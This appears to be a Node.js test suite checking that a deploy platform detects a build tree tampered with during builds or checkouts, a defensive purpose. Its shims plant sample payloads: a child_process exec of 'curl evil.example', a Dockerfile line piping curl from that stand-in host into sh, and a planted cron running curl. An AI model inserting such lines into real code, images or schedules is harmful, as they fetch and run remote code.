import { test, after } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'child_process';
import { createHash } from 'crypto';
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, existsSync, rmSync } from 'fs';
import { tmpdir } from 'os';
import { join } from 'path';

// Deploy integrity through deployApp, the way a deploy runs it: a real
// local-git managed repo, a real clone, the real pipeline. The only shim is
// docker, which records every call and, when told to, tampers with the build
// context WHILE `docker build` runs, which is the window an injected payload
// would use. A tampered tree must fail the deploy before any container is
// stopped, created or started.

const ROOT = mkdtempSync(join(tmpdir(), 'crane-integrity-deploy-'));
process.env.DATA_DIR = ROOT;
process.env.ENCRYPTION_KEY = 'd'.repeat(64);
process.env.LOG_LEVEL = 'error';
delete process.env.APPCRANE_REQUIRE_VERIFY;

const SHIM = join(ROOT, 'bin');
const EVENTS = join(ROOT, 'docker-events.jsonl');
const MODE = join(ROOT, 'tamper-mode');
mkdirSync(SHIM, { recursive: true });
writeFileSync(MODE, 'none');
// The build runs with an explicitly chosen environment (dockerBuildEnv), so the
// shim reads its paths from its own text, not from env vars.
writeFileSync(join(SHIM, 'docker'), `#!/usr/bin/env node
const { appendFileSync, readFileSync, writeFileSync, rmSync } = require('fs');
const { join } = require('path');
const argv = process.argv.slice(2);
let code = 0, out = '';
if (argv[0] === 'build') {
  const ctx = argv[argv.length - 1];
  const mode = readFileSync(${JSON.stringify(MODE)}, 'utf8').trim();
  if (mode === 'file') writeFileSync(join(ctx, 'injected.js'), 'require("child_process").exec("curl evil.example")\\n');
  if (mode === 'tracked') appendFileSync(join(ctx, 'server.js'), 'require("child_process").exec("curl evil.example")\\n');
  if (mode === 'dockerfile') appendFileSync(join(ctx, 'Dockerfile'), '\\nRUN curl evil.example | sh\\n');
  if (mode === 'cleanup') rmSync(join(ctx, 'injected.js'), { force: true });
  out = 'Successfully built deadbeef\\n';
} else if (argv[0] === 'version') {
  out = '29.0.0\\n';
} else if (argv[0] === 'image' && argv[1] === 'inspect') {
  code = 1;
} else if (argv[0] === 'inspect') {
  code = 1;
} else if (argv[0] === 'network' && argv[1] === 'inspect') {
  out = 'false|172.20.0.0/16\\n';
} else if (argv[0] === 'run' || argv[0] === 'create') {
  code = 1; out = 'shim: no containers here';
}
appendFileSync(${JSON.stringify(EVENTS)}, JSON.stringify({ verb: argv[0], sub: argv[1] || null }) + '\\n');
process.stdout.write(out);
process.exit(code);
`, { mode: 0o755 });
// git is real, through a forwarding shim that, when told to, lets a pinned
// checkout land on a different commit than the one asked for (an extra commit
// made right after `checkout --detach`), standing in for anything that moves
// HEAD between the caller's request and the build.
const REAL_GIT = execFileSync('sh', ['-c', 'command -v git']).toString().trim();
const DRIFT = join(ROOT, 'drift');
const PLANT = join(ROOT, 'plant');
const PLANT_CRON = join(ROOT, 'plant-cron');
writeFileSync(join(SHIM, 'git'), `#!/usr/bin/env node
const { spawnSync } = require('child_process');
const { existsSync, writeFileSync } = require('fs');
const argv = process.argv.slice(2);
const r = spawnSync(${JSON.stringify(REAL_GIT)}, argv, { stdio: 'inherit' });
const c = argv.indexOf('-C');
if (r.status === 0 && argv.includes('--detach') && argv.includes('checkout') && c >= 0 && existsSync(${JSON.stringify(DRIFT)})) {
  spawnSync(${JSON.stringify(REAL_GIT)}, ['-C', argv[c + 1], '-c', 'user.email=d@d.example', '-c', 'user.name=d', '-c', 'commit.gpgSign=false', 'commit', '-q', '--allow-empty', '-m', 'drift'], { stdio: 'ignore' });
}
if (r.status === 0 && argv.includes('--detach') && argv.includes('checkout') && c >= 0 && existsSync(${JSON.stringify(PLANT)})) {
  writeFileSync(require('path').join(argv[c + 1], 'injected.js'), 'require("child_process").exec("curl evil.example")\\n');
}
if (r.status === 0 && argv.includes('--detach') && argv.includes('checkout') && c >= 0 && existsSync(${JSON.stringify(PLANT_CRON)})) {
  writeFileSync(require('path').join(argv[c + 1], 'deployhub.json'), JSON.stringify({ cron: [{ name: 'planted', schedule: '* * * * *', command: 'curl evil.example' }] }));
}
process.exit(r.status ?? 1);
`, { mode: 0o755 });
process.env.PATH = `${SHIM}:${process.env.PATH}`;

const logger = (await import('../server/utils/logger.js')).default;
for (const lvl of ['warn', 'info', 'debug']) logger[lvl] = () => {};

const { initDb, getDb } = await import('../server/db.js');
initDb();
const db = getDb();
const { callTool } = await import('../server/services/mcpTools.js');
const { deployApp } = await import('../server/services/deployer.js');
const { getPortsForSlot } = await import('../server/services/portAllocator.js');
const lg = await import('../server/services/localGit.js');

after(async () => {
  const { stopHealthChecker } = await import('../server/services/healthChecker.js');
  stopHealthChecker();
  try { rmSync(ROOT, { recursive: true, force: true }); } catch (_) {}
});

global.fetch = async () => ({ ok: true, status: 200, headers: new Headers(), text: async () => '{}', json: async () => ({}) });

const CLEAN_ENV = { PATH: process.env.PATH, GIT_CONFIG_NOSYSTEM: '1', GIT_CONFIG_GLOBAL: '/dev/null', LC_ALL: 'C' };
const tipOf = (slug) => execFileSync('git', [`--git-dir=${lg.repoPath(slug)}`, 'rev-parse', 'refs/heads/main'], { env: CLEAN_ENV }).toString().trim();
const sha256 = (s) => createHash('sha256').update(s).digest('hex');

const adminId = db.prepare(
  "INSERT INTO users (name,email,role,api_key_hash,active,kind) VALUES ('diadmin','di@x.example','platform_admin','h',1,'human')",
).run().lastInsertRowid;
const admin = { id: adminId, role: 'platform_admin', name: 'diadmin' };

async function tool(name, args) {
  const r = await callTool(admin, name, args);
  const text = r?.content?.[0]?.text ?? '';
  if (r?.isError) throw new Error(text);
  return JSON.parse(text);
}
const appRow = (slug) => db.prepare('SELECT * FROM apps WHERE slug = ?').get(slug);
const events = () => (existsSync(EVENTS) ? readFileSync(EVENTS, 'utf8') : '').split('\n').filter(Boolean).map((l) => JSON.parse(l));
const CONTAINER_VERBS = new Set(['run', 'create', 'start', 'stop', 'rm', 'kill', 'restart']);

async function deploy(slug, { mode = 'none', opts = {} } = {}) {
  writeFileSync(MODE, mode);
  rmSync(EVENTS, { force: true });
  const app = appRow(slug);
  const id = db.prepare("INSERT INTO deployments (app_id, env, status, deployed_by) VALUES (?, 'sandbox', 'pending', ?)")
    .run(app.id, adminId).lastInsertRowid;
  const err = await deployApp(id, app, 'sandbox', getPortsForSlot(app.slot), opts).then(() => null, (e) => e);
  const row = db.prepare('SELECT * FROM deployments WHERE id = ?').get(id);
  return { id, err, row, log: row.log || '', ev: events() };
}

const LOCK_V1 = '{"name":"di","lockfileVersion":3,"packages":{}}\n';
const LOCK_V2 = '{"name":"di","lockfileVersion":3,"packages":{"node_modules/left-pad":{"version":"1.3.0"}}}\n';

await tool('appcrane_create_managed_app', { name: 'Integrity', slug: 'di-app', description: 'integrity' });
await tool('appcrane_push_to_managed_app', {
  slug: 'di-app', message: 'app',
  files: [
    { path: 'package.json', content: '{"name":"di","version":"1.0.0","main":"server.js","scripts":{"start":"node server.js"}}' },
    { path: 'package-lock.json', content: LOCK_V1 },
    { path: 'server.js', content: 'require("http").createServer((q, s) => s.end("ok")).listen(3000);\n' },
  ],
});

test('a clean deploy is verified before the build and before the swap, and records its lockfile', async () => {
  const tip = tipOf('di-app');
  const d = await deploy('di-app');
  assert.match(d.log, new RegExp(`Deploy integrity: release tree is exactly commit ${tip} \\(plus files AppCrane wrote: .*Dockerfile`));
  assert.match(d.log, new RegExp(`Deploy integrity: release tree still exactly commit ${tip} before the container swap`));
  assert.match(d.log, /Lockfile: package-lock\.json sha256 [0-9a-f]{12}… \(no earlier successful deploy/);
  assert.equal(d.row.lockfile_name, 'package-lock.json');
  assert.equal(d.row.lockfile_sha256, sha256(LOCK_V1));
  assert.ok(d.ev.some((e) => e.verb === 'build'), 'the image was never built');
  assert.ok(d.ev.some((e) => CONTAINER_VERBS.has(e.verb)), 'a verified tree should have reached the container swap');
});

for (const [mode, pattern] of [
  ['file', /\?\? injected\.js/],
  ['tracked', /M server\.js/],
  ['dockerfile', /Dockerfile changed after the pre-build check/],
]) {
  test(`a tree tampered during the build (${mode}) fails the deploy and no container is touched`, async () => {
    const d = await deploy('di-app', { mode });
    assert.equal(d.row.status, 'failed');
    assert.match(d.log, /Deploy integrity \(before container swap\): the release tree is not commit [0-9a-f]{40}/);
    assert.match(d.log, pattern);
    assert.ok(d.ev.some((e) => e.verb === 'build'), 'the tamper never ran');
    assert.deepEqual(d.ev.filter((e) => CONTAINER_VERBS.has(e.verb)), [], 'a container was stopped or started from a tampered tree');
  });
}

test('a requested commit that the checkout does not resolve to fails before the build', async () => {
  const tip = tipOf('di-app');
  const ok = await deploy('di-app', { opts: { targetCommit: tip.slice(0, 12) } });
  assert.doesNotMatch(ok.log, /requested commit/);
  assert.match(ok.log, new RegExp(`Deploy integrity: release tree is exactly commit ${tip}`));

  writeFileSync(DRIFT, '1');
  try {
    const bad = await deploy('di-app', { opts: { targetCommit: tip } });
    assert.equal(bad.row.status, 'failed');
    assert.match(bad.log, new RegExp(`Deploy integrity: requested commit ${tip}, but the checkout resolved to (?!${tip})[0-9a-f]{40}`));
    assert.deepEqual(bad.ev.filter((e) => e.verb === 'build' || CONTAINER_VERBS.has(e.verb)), [], 'a build or container ran from the wrong commit');
  } finally {
    rmSync(DRIFT, { force: true });
  }
});

test('a payload planted before the build and removed during it is caught before the manifest is read', async () => {
  // The pre-swap check alone would pass this tree: the file is gone again by
  // then, but it was in the build context.
  writeFileSync(PLANT, '1');
  try {
    const d = await deploy('di-app', { mode: 'cleanup', opts: { targetCommit: tipOf('di-app') } });
    assert.equal(d.row.status, 'failed');
    assert.match(d.log, /Deploy integrity \(before reading the manifest\): the release tree is not commit [0-9a-f]{40}: \?\? injected\.js/);
    assert.deepEqual(d.ev.filter((e) => e.verb === 'build' || CONTAINER_VERBS.has(e.verb)), [], 'the planted tree was built or started');
  } finally {
    rmSync(PLANT, { force: true });
  }
});

test('a deployhub.json planted after the clone is refused before its crons are saved', async () => {
  writeFileSync(PLANT_CRON, '1');
  try {
    const d = await deploy('di-app', { opts: { targetCommit: tipOf('di-app') } });
    assert.equal(d.row.status, 'failed');
    assert.match(d.log, /Deploy integrity \(before reading the manifest\): the release tree is not commit [0-9a-f]{40}: \?\? deployhub\.json/);
    assert.equal(db.prepare("SELECT COUNT(*) n FROM app_cron_jobs WHERE app_id = ?").get(appRow('di-app').id).n, 0);
  } finally {
    rmSync(PLANT_CRON, { force: true });
  }
});

test('the lockfile line says whether it changed since the previous successful deploy, and which file', async () => {
  const first = await deploy('di-app');
  db.prepare("UPDATE deployments SET status = 'live' WHERE id = ?").run(first.id);
  const same = await deploy('di-app');
  assert.match(same.log, new RegExp(`Lockfile: package-lock\\.json sha256 [0-9a-f]{12}…, unchanged since deploy #${first.id}\\.`));

  await tool('appcrane_push_to_managed_app', { slug: 'di-app', message: 'add left-pad', files: [{ path: 'package-lock.json', content: LOCK_V2 }] });
  const changed = await deploy('di-app');
  assert.match(changed.log, new RegExp(`Lockfile CHANGED since deploy #${first.id} \\(package-lock\\.json\\): was package-lock\\.json ${sha256(LOCK_V1).slice(0, 12)}…, now package-lock\\.json sha256 ${sha256(LOCK_V2).slice(0, 12)}…`));
  assert.equal(changed.row.lockfile_sha256, sha256(LOCK_V2));
  // Failed deploys never count as "previous successful".
  const again = await deploy('di-app');
  assert.match(again.log, new RegExp(`CHANGED since deploy #${first.id} `));
});
